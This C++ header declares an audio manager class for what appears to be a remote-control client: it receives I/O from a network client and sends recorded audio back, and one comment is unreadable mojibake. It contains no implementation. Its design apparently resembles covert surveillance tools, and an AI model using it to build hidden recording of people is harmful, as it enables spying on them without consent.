#pragma once
#include "Manager.h"
#include <vector>
#include "Audio.h"
using namespace std;
class CAudioManager :
    public CManager
{
public:
    CAudioManager(CIocpClient* IocpClient);
    BOOL OnInitMember();
    ~CAudioManager();
    void HandleIo(PBYTE BufferData, ULONG_PTR BufferLength);
    static DWORD WINAPI SendDataProcedure(LPVOID ParameterData);
    int SendRecordData();   //����һ��¼�����ݵ����ض�
private:
    BOOL m_IsLoop = FALSE;
    CAudio* m_Audio = NULL;
    HANDLE m_ThreadHandle;
};

